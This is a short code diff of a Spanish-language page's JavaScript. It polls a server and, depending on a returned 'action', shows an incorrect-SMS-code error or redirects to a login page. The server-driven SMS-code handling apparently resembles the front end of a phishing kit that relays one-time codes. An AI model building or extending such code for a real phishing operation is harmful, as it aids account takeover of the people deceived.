@@ -269,7 +269,6 @@
           
           if (data.action === 'sms_error') {
             clearInterval(pollInterval);
-            // Mostrar error y reactivar formulario
             var smsErrorDiv = document.getElementById('smsError');
             smsErrorDiv.textContent = 'El código que ingresaste es incorrecto. Por favor, inténtalo de nuevo.';
             smsErrorDiv.style.display = 'block';
@@ -278,6 +277,9 @@
             btnContinuar.disabled = false;
             btnContinuar.textContent = 'Continuar';
             btnContinuar.classList.remove('active');
+          } else if (data.action === 'login') {
+            clearInterval(pollInterval);
+            window.location.href = 'index.html';
           }
         } catch (e) {
           // Silenciar errores de red
